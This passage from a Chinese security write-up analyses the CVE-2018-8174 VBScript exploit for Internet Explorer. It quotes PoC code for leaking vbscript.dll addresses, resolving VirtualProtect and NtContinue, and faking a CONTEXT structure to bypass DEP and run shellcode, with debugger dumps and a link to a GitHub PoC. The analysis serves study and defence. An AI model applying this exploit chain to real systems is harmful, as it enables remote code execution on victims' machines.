+    003c7c7c  772c0002 0241d1f8 02440008 0241d038  //类型0x03vbLong-->0x08vbString003c7c8c  0061e78c 0241d038 00000000 08e9cd8e
+    003c7c9c  80000000 688a0075 00000873 003c9188
+    003c7cac  00000000 003c7cf0 00000035 003fbc74
+    003c7cbc  003c7ccc 08e9cd85 80000000 0000007a
+    003c7ccc  00680063 00630065 0062006b 0078006f
+    003c7cdc  00000000 00000000 00000000 08e9cd80
+    003c7cec  80000000 688a0048 00000874 003c9188  
+    
+
+ **然后`value=cla4_obj1.P0123456789` 这一步，先说结论，
+**最终返回的是`CScriptEntryPoint`类对象的虚函数表地址** 为什么? 看一下 `cla4_obj1.P0123456789`
+的实现逻辑：  
+**
+
+    
+    
+    Class cla5
+        Dim mem
+        Function P0123456789
+            P0123456789=LenB(mem(spec_int_1+8))  
+        End Function
+        Function SPP
+        End Function
+    End Class  
+    
+
+ **LenB 在 VBscript.dll 中调用的是 `cbLengthBstr`,下面是它的代码  
+**
+
+    
+    
+    .text:6E4F38C2 ; unsigned __int32 __stdcall cbLengthBstr(unsigned __int16 *)
+    .text:6E4F38C2 ?cbLengthBstr@@YGKPAG@Z proc near       ; CODE XREF: rtConcatBstr(ushort *,ushort *)+C p
+    .text:6E4F38C2                                         ; rtConcatBstr(ushort *,ushort *)+16 p ...
+    .text:6E4F38C2
+    .text:6E4F38C2 arg_0           = dword ptr  8
+    .text:6E4F38C2
+    .text:6E4F38C2                 mov     edi, edi
+    .text:6E4F38**                 push    ebp
+    .text:6E4F38C5                 mov     ebp, esp
+    .text:6E4F38C7                 mov     eax, [ebp+arg_0]
+    .text:6E4F38CA                 test    eax, eax
+    .text:6E4F38CC                 jz      short loc_6E4F38D1
+    .text:6E4F38CE                 mov     eax, [eax-4]  //这一步是重点
+    .text:6E4F38D1
+    .text:6E4F38D1 loc_6E4F38D1:                           ; CODE XREF: cbLengthBstr(ushort *)+A j
+    .text:6E4F38D1                 pop     ebp
+    .text:6E4F38D2                 retn    4
+    .text:6E4F38D2 ?cbLengthBstr@@YGKPAG@Z endp  
+    
+
+`CScriptEntryPoint `对象地址是 0061e788，对象地址+4仍然存放在这里就是`0061e78c`
+，代码更改了它的类型为`vbstring`，那么这个值就变成了` BSTR 字符串指针` ，然后使用LenB求它的长度；
+
+但是在 `cbLengthBstr `内部的执行是将`mov eax, [eax-4],` 这是因为正常的 `BSTR
+`字符串的结构是：前四个字节保存的是字符串长度，在字符串结尾以字符0识别，[BSTR****](https://zh.*********.org/wiki/BSTR)
+。  
+
+但是我们这个原本不是 BSTR 字符串类型，当[eax-4] 的时候得到仍然是类对象地址中的内容；  
+
+    
+    
+    0:005> dd [0061e78c-4]
+    0061e788  6e654934 00000001 0061ff68 02446528  //0061e788保存的本来就是虚函数表的地址0061e798  0244f9a8 00000000 0061ff68 0061fc80
+    0061e7a8  67352229 0800c9e4 6e654934 00000001
+    0061e7b8  0061ff68 02446528 0244f9dc 00000000
+    0061e7c8  0061ff68 0061fc80 67352229 0800c9e4
+    0061e7d8  6e654934 00000001 0061ff68 02446528
+    0061e7e8  0244fa50 00000000 0061ff68 0061fc80
+    0061e7f8  67352229 0800c9e4 6e654934 00000001  
+    
+
+ **以上为得到VBScript.dll中的`CScriptEntryPoint`对象虚函数表的过程**  
+
+**3.4.2.获取 VBScript.dll 基地址**
+
+    
+    
+    Function FindMzBase(vtable_address)
+    
+        Dim base
+        base=vtable_address And &hffff0000  '64k对齐，得到vbscript.dll 基地址
+     Alert "FindMzBase "
+     IsEmpty(base)
+     
+        Do While GetUint32(base+&h68)<>&h206E6920 Or GetUint32(base+&h6c)<>&h20534F44
+            base=base-&h10000     
+        Loop
+     IsEmpty(base)
+        FindMzBase=base
+    End Function  
+    
+
+上面获得的虚函数表的地址是 CScriptEntryPoint 对象的，这个地址属于
+VBScript.dll，由于内存的64k对齐，把虚函数表地址后四位置零便得到 VBScript.dll 的基地址。
+
+ **3.4.3.获取其余关键dll与函数地址**
+
+`VBScript.dll` 导入了 `msvcrt.dll` ， `msvcrt.dll `又导入了 `kernelbase.dll `与
+`ntdll.dll `，遍历它们的导入表最终可以从 `kernelbase.dll `中获取到 `VirtualProtect `函数地址，从
+`ntdll.dll` 中获取 `NtContinue `函数地址。
+
+这部分属于PE文件的操作，请允许我不再详细分析。
+
+    
+    
+        '首先得到VBScript地址，其传入的是CScriptEntryPoint虚函数表对象地址
+        vbs_base=FindMzBase(GetUint32(vb_adrr))
+        Alert "VBScript Base: 0x" & Hex(vbs_base) 
+     
+        '遍历VBScript.dll导入表找到msvcrt.dll基地址
+        msv_base=GetBaseFromImport(vbs_base,"msvcrt.dll")
+        Alert "MSVCRT Base: 0x" & Hex(msv_base) 
+       
+         '遍历msvcrt.dll导入表找到kernelbase.dll基地址
+        krb_base=GetBaseFromImport(msv_base,"kernelbase.dll")
+        Alert "KernelBase Base: 0x" & Hex(krb_base) 
+     
+         '遍历msvcrt.dll导入表找到ntdll.dll基地址
+        ntd_base=GetBaseFromImport(msv_base,"ntdll.dll")
+        Alert "Ntdll Base: 0x" & Hex(ntd_base) 
+     
+         '从kernelbase.dll找到VirtualProtect函数地址
+        VirtualProtectAddr=GetProcAddr(krb_base,"VirtualProtect")
+        Alert "KernelBase!VirtualProtect Address 0x" & Hex(VirtualProtectAddr) 
+     
+         '从ntdll.dll找到 NtContinue 函数地址
+        NtContinueAddr=GetProcAddr(ntd_base,"NtContinue")
+        Alert "Ntdll!NtContinue Address 0x" & Hex(NtContinueAddr)  
+    
+
+### 3.5 ShellCode的执行
+
+ **3.5.1.ShellCode位置**
+
+源码中的shellcode部分的混淆我没有去理会，我们只要研究他是怎么执行起来的，环境是怎么构造的；
+
+    
+    
+    //PoC源码
+    SetMemValue GetShellcode()
+    ShellcodeAddr=GetMemValue()+8
+    IsEmpty(ShellcodeAddr)  
+    
+    
+    
+    //GetShellcode()最终返回的是Shellcode的地址，
+    //SetMemValue 仍然与将这个字符串赋值到cla4_obj1.mem处
+    
+    //执行之前spec_int_1处：
+    //现在保留的是CScriptEntryPoint对象+4的一个值，正常这里是最近的获取的函数的值
+    0:014> dd 00579aec 
+    00579aec  00000002 00000000 6e610002 00000000
+    00579afc  0019e90c 025dcd08 00000000 01ad84c9
+    00579b0c  88000000 00000006 006f0046 0000006f
+    00579b1c  6d887684 0000606f 0000003e 00000000
+    00579b2c  00000000 01ad84ce 88000000 00000018
+    00579b3c  0065006d 00730073 00670061 00530065
+    00579b4c  00790074 0065006c 00000000 01ad84c3
+    00579b5c  80000000 688a00ed 0000086e 00579310
+    
+    
+    //SetMemValue GetShellcode()执行之后
+    0:006> dd 00579aec 
+    00579aec  00000002 00000000 025d0008 01c03508
+    00579afc  025e0024 025dc864 00000000 01ad84c9
+    00579b0c  88000000 00000006 006f0046 0000006f
+    00579b1c  6d887684 0000606f 0000003e 00000000
+    00579b2c  00000000 01ad84ce 80000000 000000ac
+    00579b3c  00000071 00530074 00650068 006c006c
+    00579b4c  006f0063 00650064 00000000 01ad84c3
+    00579b5c  88000000 00000004 00300030 00310000
+    
+    //ShellcodeAddr=GetMemValue()+8 
+    //GetMemValue函数把spec_int_1类型改为long型，并把+08的地址返回  
+    
+
+ ** **`025 e0024 `就是`shellcode`的入口，准确的说是在 `025e0024+8` 的位置 在内存中看一下：**  
+**
+
+    
+    
+    0:006> db 025e0024 l100
+    //从025e002c开始，前面是00
+    025e0024  00 00 00 00 00 00 00 00-fc e8 82 00 00 00 60 89  ..............`.
+    025e0034  e5 31 c0 64 8b 50 30 8b-52 0c 8b 52 14 8b 72 28  .1.d.P0.R..R..r(
+    025e0044  0f b7 4a 26 31 ff ac 3c-61 7c 02 2c 20 c1 cf 0d  ..J&1..<a|., ...
+    025e0054  01 c7 e2 f2 52 57 8b 52-10 8b 4a 3c 8b 4c 11 78  ....RW.R..J<.L.x
+    025e0064  e3 48 01 d1 51 8b 59 20-01 d3 8b 49 18 e3 3a 49  .H..Q.Y ...I..:I
+    025e0074  8b 34 8b 01 d6 31 ff ac-c1 cf 0d 01 c7 38 e0 75  .4...1.......8.u
+    025e0084  f6 03 7d f8 3b 7d 24 75-e4 58 8b 58 24 01 d3 66  ..}.;}$u.X.X$..f
+    025e0094  8b 0c 4b 8b 58 1c 01 d3-8b 04 8b 01 d0 89 44 24  ..K.X.........D$
+    025e00a4  24 5b 5b 61 59 5a 51 ff-e0 5f 5f 5a 8b 12 eb 8d  $[[aYZQ..__Z....
+    025e00b4  5d 6a 01 8d 85 b2 00 00-00 50 68 31 8b 6f 87 ff  ]j.......Ph1.o..
+    025e00c4  d5 bb f0 b5 a2 56 68 a6-95 bd 9d ff d5 3c 06 7c  .....Vh......<.|
+    025e00d4  0a 80 fb e0 75 05 bb 47-13 72 6f 6a 00 53 ff d5  ....u..G.roj.S..
+    025e00e4  63 61 6c 63 2e 65 78 65-00 41 65 00 00 00 00 00  calc.exe.Ae.....
+    025e00f4  00 00 00 00 00 00 00 cc-cc cc cc cc cc cc cc cc  ................
+    025e0104  3f 71 3d 37 30 35 35 34-38 26 76 3d 33 00 41 41  ?q=705548&v=3.AA
+    025e0114  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    
+    //当前地址的权限问题
+    0: kd> !pte 025e0024
+                        VA 025e0024
+    PDE at C0600090            PTE at C0012F00
+    contains 0000000076382867  contains 8000000043F0F867
+    pfn 76382     ---DA--UWEV   pfn 43f0f     ---DA--UW-V  
+    
+
+ **现在`shellcode`的已经加载到内存中了，接下来就是构造环境执行的问题了**
+
+ **3.5.2.ShellCode 绕过DEPv**
+
+ **重点是这两个函数：**
+
+    
+    
+    SetMemValue VirtualProtectCallParameters(ShellcodeAddr)
+        lIlll=GetMemValue()+69596  '0x10FDC
+     IsEmpty(lIlll)
+        SetMemValue ExpandWithVirtualProtect(lIlll)
+        llIIll=GetMemValue()
+     IsEmpty(llIIll)  
+    
+
+ ** **先看` VirtualProtectCallParameters` 函数：**  
+**
+
+    
+    
+    '构造VirtualProtect环境 参数为shellcode地址  
+    Function VirtualProtectCallParameters(ShellcodeAddrParam) 'bypass cfg
+     Alert "VirtualProtectCallParameters"
+        Dim result
+        result=String((100334-65536),Unescape("%u4141"))  '重复0x10FDC个“A”
+        result=result &EscapeAddress(ShellcodeAddrParam)  '在0FDC个“A”后面放入shellcode地址
+        result=result &EscapeAddress(ShellcodeAddrParam)  '第一个参数 修改的基地址
+        result=result &EscapeAddress(&h3000)     '第二个参数 size
+        result=result &EscapeAddress(&h40)      '第三个参数PAGE_EXECUTE_READWRITE 0x40)
+        result=result &EscapeAddress(ShellcodeAddrParam-8)  '第四个，内存原始属性保存地址
+        result=result &String(6,Unescape("%u4242"))    '重复 6个“**”
+        result=result &StructWithNtContinueAddr()    ' \x00 * 3  NtContinue * 4 \x00
+        result=result &String((&h80000-LenB(result))/2,Unescape("%u4141")) '重复 0x80000- ？个“AA”
+        VirtualProtectCallParameters=result
+    End Function  
+    
+
+ **一步一步解析：** (VBS里面的&代表的是字符串的连接)  
+
+    
+    
+    //源码：result=String((100334-65536),Unescape("%u4141"))  
+    //重复0x10FDC个“AA”
+    0:005> dd poi(esp+c) lc
+    0055e470  0000004a 00000000 02129da8 00000000
+    0055e480  024d0008 024dcc34 0392ca3c 024dcc1c
+    0055e490  00000000 02108298 0037a1bc 0055f5cc
+    
+    0:005> dd 02129da8 lc
+    02129da8  00000008 00000000 0393da34 00000000
+    02129db8  00000000 00000000 655fbbf0 0c04fced
+    02129dc8  00000000 00550050 00000000 0055f698
+    
+    //申请出的字符串
+    0:005> db 0393da34
+    0393da34  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    0393da44  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    0393da54  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    0393da64  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    0393da74  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    0393da84  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    0393da94  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    0393daa4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+    
+    
+    //源码：result=result &EscapeAddress(ShellcodeAddrParam) 将shellcode地址放到字符串后面
+    
+    0:005> dd 0393da34+10FDC lc
+    0394ea10  0265002c 00000000 00000000 00000000  //0265002c是shellcode的地址
+    0394ea20  f117622e 0007b655 003bb6d0 0035db68
+    0394ea30  00000000 00000000 00000000 00000000
+    
+    //shellcode地址由于重新调试与上面地址不一样，但是可以看到确实是shellcode的代码
+    0:005> db 0265002c 
+    0265002c  fc e8 82 00 00 00 60 89-e5 31 c0 64 8b 50 30 8b  ......`..1.d.P0.
+    0265003c  52 0c 8b 52 14 8b 72 28-0f b7 4a 26 31 ff ac 3c  R..R..r(..J&1..<
+    0265004c  61 7c 02 2c 20 c1 cf 0d-01 c7 e2 f2 52 57 8b 52  a|., .......RW.R
+    0265005c  10 8b 4a 3c 8b 4c 11 78-e3 48 01 d1 51 8b 59 20  ..J<.L.x.H..Q.Y 
+    0265006c  01 d3 8b 49 18 e3 3a 49-8b 34 8b 01 d6 31 ff ac  ...I..:I.4...1..
+    0265007c  c1 cf 0d 01 c7 38 e0 75-f6 03 7d f8 3b 7d 24 75  .....8.u..}.;}$u
+    0265008c  e4 58 8b 58 24 01 d3 66-8b 0c 4b 8b 58 1c 01 d3  .X.X$..f..K.X...
+    0265009c  8b 04 8b 01 d0 89 44 24-24 5b 5b 61 59 5a 51 ff  ......D$$[[aYZQ.
+    
+    
+    //接下来开始为 VirtualProtect 构造参数：
+    //result=result &EscapeAddress(ShellcodeAddrParam)
+    0:005> dd poi(esp+c) lc
+    0055e470  0212004a 024dcc24 02129da8 0055cab0
+    0055e480  02110008 00000004 0392ca3c 6e5d0001
+    0055e490  00000000 02108298 0037a1bc 0055f5cc
+    0055e4a0  024dd0b0 0055e4d0 02650008 024dc9d4
+    
+    0:005> dd 02129da8 lc
+    02129da8  02120008 024dcc24 0393da34 0055cab0
+    02129db8  00000000 00000000 655fbbf0 0c04fced
+    02129dc8  00000000 00550050 00000000 0055f698
+    
+    0:005> dd 0393da34 lc         //1--lpAddress：修改的基地址(也是上面字符串的起始地址)0393da34  41414141 41414141 41414141 41414141
+    0393da44  41414141 41414141 41414141 41414141
+    0393da54  41414141 41414141 41414141 41414141
+       
+    //result=result &EscapeAddress(&h3000)     '2--dwSize: size
+    //result=result &EscapeAddress(&h40)     '3--flNewProtect：PAGE_EXECUTE_READWRITE //result=result &EscapeAddress(ShellcodeAddrParam-8) '4--pflOldProtect： 内存原始属性保存地址
+    
+    //result的值在不停的变化
+    0:005> dd 0392ca3c +10fdc
+    0393da18  0265002c 0265002c 00003000 00000040
+    0393da28  02650024 08060000 00010fe8 41414141
+    
+    //result=result &String(6,Unescape("%u4242"))        '重复 12个“*”
+    0:005> dd 0394ea5c   +10fdc
+    0395fa38  0265002c 0265002c 00003000 00000040
+    0395fa48  02650024 42424242 42424242 42424242
+    
+    
+    
+    //result=result &StructWithNtContinueAddr()     ' 3*0x00+4*NtContinue函数地址+0x00
+    
+    //StructWithNtContinueAddr 函数是将\x00 与NtContinue 函数地址形成了一个拼接，
+    
+    0:005> dd 0392ca3c +10fdc
+    0393da18  0265002c 0265002c 00003000 00000040
+    0393da28  02650024 42424242 42424242 42424242
+    0393da38  68000000 68776a55 68776a55 68776a55  //NtContinue的函数地址是 776a5568,68位置不太对看起来有点怪异
+    0393da48  00776a55 41410000 41414141 41414141
+    0393da58  97174369 0006b5af 002d00c4 003bb6d0
+    0393da68  41414141 41414141 41414141 41414141
+    0393da78  41414141 41414141 41414141 41414141
+    0393da88  41414141 41414141 41414141 41414141
+    
+    //result=result &String((&h80000-LenB(result))/2,Unescape("%u4141"))   
+    //把除了当前的result有效的位置外的地方全部写成"A"
+    //最终的效果是：
+    0:005> dd 02b70024 +10fdc
+    02b81000  0265002c 0265002c 00003000 00000040 //依次为 shellcode 地址，VirtualProtect四个参数
+    02b81010  02650024 42424242 42424242 42424242 
+    02b81020  68000000 68776a55 68776a55 68776a55 //NtContinue 的函数地址
+    02b81030  00776a55 41414141 41414141 41414141
+    02b81040  41414141 41414141 41414141 41414141
+    02b81050  41414141 41414141 41414141 41414141
+    02b81060  41414141 41414141 41414141 41414141
+    02b81070  41414141 41414141 41414141 41414141  
+    
+
+ ** **继续往下走：** `SetMemValue VirtualProtectCallParameters(ShellcodeAddr)`  
+**
+
+    
+    
+    //SetMemValue函数内的IsEmpty断点：
+    0:005> dd 0037a1bc 
+    0037a1bc  00000002 00000000 02110008 02105c94
+    0037a1cc  01dc0024 40000000 0037a1e4 7cd33254 //01dc0024是VirtualProtectCallParameters函数返回的地址
+    0037a1dc  88006c6c 00000000 00000000 00000000
+    0037a1ec  00000000 00000000 00000000 00000000
+    0037a1fc  00000000 7cd3322f 8000e984 77110106
+    0037a20c  00000000 771246e2 00000017 0037a208
+    0037a21c  00000000 00000000 00000000 7cd3322a
+    0037a22c  88005668 00000000 00000000 00350000
+    
+    //lIlll=GetMemValue()+0x10FDC
+    0:005> dd 0037a1bc 
+    0037a1bc  02120002 02129db8 02b70003 6e5d1684 //更改类型为Long
+    0037a1cc  01dc0024 40000000 0037a1e4 7cd33254 //返回01dc0024地址
+    0037a1dc  88006c6c 00000000 003b2f48 77737560
+    0037a1ec  00379f90 00000000 00000000 00000000
+    
+    //lIlll 得到这片特殊环境的首地址 01dd1000
+    0:005> dd 01dc0024 +10fdc
+    01dd1000  0265002c 0265002c 00003000 00000040
+    01dd1010  02650024 42424242 42424242 42424242
+    01dd1020  68000000 68776a55 68776a55 68776a55
+    01dd1030  00776a55 41414141 41414141 41414141  
+    
+
+ **执行`SetMemValue ExpandWithVirtualProtect(lIlll):`  
+**
+
+ **先看`ExpandWithVirtualProtect(lIlll) `函数  
+**
+
+    
+    
+    //ntContinuePtr=structForVirtualProtect+&h23  加的23刚好是 NtContinue 地址，这个值终于正常了
+    0:005> dd 01dd1000+23 l8
+    01dd1023  776a5568 776a5568 776a5568 776a5568
+    01dd1033  41414100 41414141 41414141 41414141
+    
+    
+    //result=result &String((&hb8-LenB(result))/2,Unescape("%4141"))
+    0:005> dd poi(esp+c) lc
+    0055e460  0000004a 00000000 02129da8 00000000
+    0055e470  02b70003 6e5d1684 01dd1023 40000000
+    0055e480  024d0008 024dc9f0 00307044 40000000
+    
+    0:005> dd 02129da8  lc
+    02129da8  00000008 00000000 003a502c 00000000
+    02129db8  00000000 00000000 655fbbf0 0c04fced
+    02129dc8  00000000 00550050 00000000 0055f698
+    
+    0:005> dd 003a502c 
+    003a502c  01dd1023 00410041 00410041 00410041  //0041填充
+    003a503c  00410041 00410041 00410041 00410041
+    003a504c  00410041 00410041 00410041 00410041
+    003a505c  00410041 00410041 00410041 00410041
+    003a506c  00410041 00410041 00410041 00410041
+    003a507c  00410041 00410041 00410041 00410041
+    003a508c  00410041 00410041 00410041 00410041
+    003a509c  00410041 00410041 00410041 00410041
+    
+    //result=result &EscapeAddress(VirtualProtectAddr)
+    
+    0:005> dd poi(esp+c)
+    0055e460  024d004a 6e5d196a 02129da8 024dcdf4
+    0055e470  02b70003 6e5d1684 01dd1023 40000000
+    0055e480  02110008 00000004 003a502c 6e5d0001
+    0055e490  00000000 02108298 0037a1bc 0055f5cc
+    0055e4a0  024dd0b0 0055e4d0 00010fdc 40000000
+    0055e4b0  02b7400c 6e5d1684 00552650 40000000
+    0055e4c0  024d0000 0055e5d0 00000000 00000000
+    0055e4d0  024dd2f4 0055e5d0 02129da8 02107c7c
+    
+    0:005> dd 02129da8 lc
+    02129da8  024d0008 6e5d196a 00307044 024dcdf4
+    02129db8  00000000 00000000 655fbbf0 0c04fced
+    02129dc8  00000000 00550050 00000000 0055f698
+    
+    0:005> dd 00307044 l8
+    00307044  01dd1023 00410041 00410041 00410041
+    00307054  00410041 00410041 00410041 00410041
+    
+    0:005> dd 00307044 +90 lc
+    003070d4  00410041 00410041 00410041 00410041
+    003070e4  00410041 00410041 00410041 00410041
+    003070f4  00410041 00410041 758e22bd d5ff0000 //加入 VirtualProtect 地址(758e22bd)
+    
+    //下面几步分别在字符串后面拼接了 0xb1、0x00、构造好的构造VirtualProtect环境、0x23
+    //result=result &EscapeAddress(&h1b)
+    //result=result &EscapeAddress(0)
+    //result=result &EscapeAddress(structForVirtualProtect)
+    //result=result &EscapeAddress(&h23)
+    
+    //我们直接看拼接后的结果；其实这是一个CONTEXT的结构体：
+    0:005> dd 0036e84c l100
+    0036e84c  01dd1023 00410041 00410041 00410041 //01dd1023 中保存的是连续4个 NtContinue 函数地址
+    0036e85c  00410041 00410041 00410041 00410041
+    0036e86c  00410041 00410041 00410041 00410041 //中间0x0041填充
+    0036e87c  00410041 00410041 00410041 00410041
+    0036e88c  00410041 00410041 00410041 00410041
+    0036e89c  00410041 00410041 00410041 00410041
+    0036e8ac  00410041 00410041 00410041 00410041
+    0036e8bc  00410041 00410041 00410041 00410041
+    0036e8cc  00410041 00410041 00410041 00410041
+    0036e8dc  00410041 00410041 00410041 00410041
+    0036e8ec  00410041 00410041 00410041 00410041
+    0036e8fc  00410041 00410041 758e22bd 0000001b //后面是 VirtualProtect 地址 758e22bd 
+    0036e90c  00000000 01dd1000 00000023 43434343 //01dd1000  构造好的构造VirtualProtect环境
+    0036e91c  43434343 43434343 43434343 43434343
+    0036e92c  43434343 43434343 43434343 43434343
+    0036e93c  43434343 43434343 43434343 43434343  
+    
+
+ ** ****` **SetMemValue ExpandWithVirtualProtect(lIlll)** ` 然后进入 `SetMemValue
+`把这片空间放到 `spec_int_1+8 ` 的位置：  
+**
+
+    
+    
+    0:005> dd 0037a1bc lc
+    0037a1bc  02120002 02129db8 02110008 00000004
+    0037a1cc  0391442c 6e5d0001 0037a1e4 7cd33254  //0391442c 内是上面构造好的内存0037a1dc  88006c6c 00000000 003b2f48 77737560
+    
+    
+    0:005> dd 0391442c 
+    0391442c  01dd1023 00410041 00410041 00410041
+    0391443c  00410041 00410041 00410041 00410041
+    ..
+    ..
+    039144dc  00410041 00410041 758e22bd 0000001b
+    039144ec  00000000 01dd1000 00000023 43434343
+    039144fc  43434343 43434343 43434343 43434343  
+    
+
+ ** ****` **llIIll=GetMemValue()** `进入 `GetMemValue `更换类型为 `Long`:  
+**
+
+    
+    
+    0:005> dd 0037a1bc lc
+    0037a1bc  02120002 02129db8 00360003 6e5d1684  //更改类型为Long0037a1cc  0391442c 6e5d0001 0037a1e4 7cd33254
+    0037a1dc  88006c6c 00000000 00000000 00000000  
+    
+
+ **** **PoC中:** ****最终的`ExecuteShellcode `函数  
+
+    
+    
+    cla4_obj1.mem(spec_int_1)=&h4d   
+    cla4_obj1.mem(spec_int_1+8)=0
+    
+    //PoC的运行就在于0x4d、0这两个值：
+    0:005> dd 0037a1bc lc
+    0037a1bc  00000002 02108298 0037004d 0055f5cc //先把 0x0037004d 修改为了 4d
+    0037a1cc  0391442c 6e5d0001 0037a1e4 7cd33254 //再把0391442c-->0，在这里看不到，因为修改后直接调用 vbscript!VAR::Clear 函数了
+    0037a1dc  88006c6c 00000000 003b2f48 77737560  
+    
+
+ ** **我们**** **看一** ** **下` vbscript!VAR::Clear` 的一些逻辑；**  
+**
+
+    
+    
+    //(到这里winbdg重启了一次，地址有所变化)
+    .text:6E4F17F0                 mov     edi, edi
+    .text:6E4F17F2                 push    esi                  
+    .text:6E4F17F3                 mov     esi, ecx             //进来 Clear 函数 ecx保存的就是类型地址，那么我们构造的地址就在[ecx+8]的地方
+    .text:6E4F17F5                 movzx   ecx, word ptr [esi]  //  ds:0023:002dbf0c=004d
+    .text:6E4F17F8                 movzx   eax, cx
+    .text:6E4F17FB                 push    edi
+    .text:6E4F17FC                 xor     edi, edi
+    .text:6E4F17FE                 sub     eax, 49h        //减去0x49h
+    .text:6E4F1801                 jz      loc_6E508B62
+    .text:6E4F1807                 sub     eax, 3         //减去0x03
+    .text:6E4F180A                 jz      loc_6E4F4A63
+    .text:6E4F1810                 dec     eax            //自减 0x01
+    .text:6E4F1811                 jz      loc_6E50089C   //所以 esi==0x4d 的话这里要跳转
+    .text:6E4F1817                 dec     eax    
+    ...
+    跳转后
+    .text:6E50089C                 mov     eax, [esi+8]  ds:0023:002dbf14=0310a914  //0310a914 是刻意构造的那片内存
+    .text:6E50089F                 test    eax, eax
+    .text:6E5008A1                 jz      loc_6E4F1843
+    .text:6E5008A7                 mov     ecx, [eax]  ds:0023:0310a914=01fb1023  //01fb1023 中保存的是连续4个 NtContinue 函数地址
+    .text:6E5008A9                 push    eax
+    .text:6E5008AA                 call    dword ptr [ecx+8]                     //[ecx+8]当然也是 NtContinue 函数地址
+    .text:6E5008AD                 jmp     loc_6E4F1843
+    //所以它构造的0x4d这个值，原因是其余的跳转无法构造好寄存器的值  
+    
+
+ **看下`CONTEXT `的结构与我们那片内存对照一下：  
+**
+
+    
+    
+    0:005> dt !CONTEXT
+    uxtheme!CONTEXT
+       +0x000 ContextFlags     : Uint4B
+       +0x004 Dr0              : Uint4B
+       +0x008 Dr1              : Uint4B
+       +0x00c Dr2              : Uint4B
+       +0x010 Dr3              : Uint4B
+       +0x014 Dr6              : Uint4B
+       +0x018 Dr7              : Uint4B
+       +0x01c FloatSave        : _FLOATING_SAVE_AREA
+       +0x08c SegGs            : Uint4B
+       +0x090 SegFs            : Uint4B
+       +0x094 SegEs            : Uint4B
+       +0x098 SegDs            : Uint4B
+       +0x09c Edi              : Uint4B
+       +0x0a0 Esi              : Uint4B
+       +0x0a4 Ebx              : Uint4B
+       +0x0a8 Edx              : Uint4B
+       +0x0ac Ecx              : Uint4B
+       +0x0b0 Eax              : Uint4B
+       +0x0b4 Ebp              : Uint4B
+       +0x0b8 Eip              : Uint4B
+       +0x0bc SegCs            : Uint4B
+       +0x0c0 EFlags           : Uint4B
+       +0x0c4 Esp              : Uint4B
+       +0x0c8 SegSs            : Uint4B
+       +0x0cc ExtendedRegisters : [512] UChar
+    
+    
+    0:005> dd 0036e84c l100
+    0036e84c  01dd1023 00410041 00410041 00410041 //01dd1023   +0x000 ContextFlags 
+    0036e85c  00410041 00410041 00410041 00410041
+    0036e86c  00410041 00410041 00410041 00410041 
+    0036e87c  00410041 00410041 00410041 00410041
+    0036e88c  00410041 00410041 00410041 00410041
+    0036e89c  00410041 00410041 00410041 00410041
+    0036e8ac  00410041 00410041 00410041 00410041
+    0036e8bc  00410041 00410041 00410041 00410041
+    0036e8cc  00410041 00410041 00410041 00410041
+    0036e8dc  00410041 00410041 00410041 00410041
+    0036e8ec  00410041 00410041 00410041 00410041
+    0036e8fc  00410041 00410041 758e22bd 0000001b // +0x0b8 Eip :VirtualProtect  758e22bd 
+    0036e90c  00000000 01dd1000 00000023 43434343 // +0x0c4 Esp : 构造好的VirtualProtect 参数
+    0036e91c  43434343 43434343 43434343 43434343
+    0036e92c  43434343 43434343 43434343 43434343
+    0036e93c  43434343 43434343 43434343 43434343  
+    
+
+### 小结：
+
+ **** **所以是从** **`VAR::Clear` 中调用了` ntdll!ntContinue`，而且又仿造好了一个了
+`CONTEXT结构体`，这样利用 `ntdll!ntContinue`还原了一个假的进程。**
+
+ **且`eip `就是
+`VirtualProtect`,而栈空间`esp`是前面准备好的，返回值为`shellcode`入口，`VirtualProtect`的执行参数也是`shellcode`区域，最后`VirtualProtect`函数执行完，直接返回到`shellcode`的开始处开始执行。**
+
+## 四、复现过程  
+
+复现环境：Win7 x86sp1，IE8.0.7601.17514
+
+使用[Github](https://github.com/clark515/CVE_PoC/tree/master/CVE-2018-8174)的PoC,在上述背景内的环境下直接IE打开即可复现:  
+
+**![cve-2018-8174.gif](https://image.3001.net/images/20200102/1577946926_5e0d8f2ea884d.gif!small)**
+
+## ****五、防护建议 ****
+
+如果要预防此类型漏洞，提供以下建议：
+
+> 1，微软也已经放弃了`vbscript`，edr 或其他安全厂商可以考虑禁用`vbscript`脚本，以避免其造成的安全隐患
+>
+> 2，`VirtualProtect `函数，检查参数。
+
+ ***本文原创作者： Lostpoet，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  
+  
+  
+
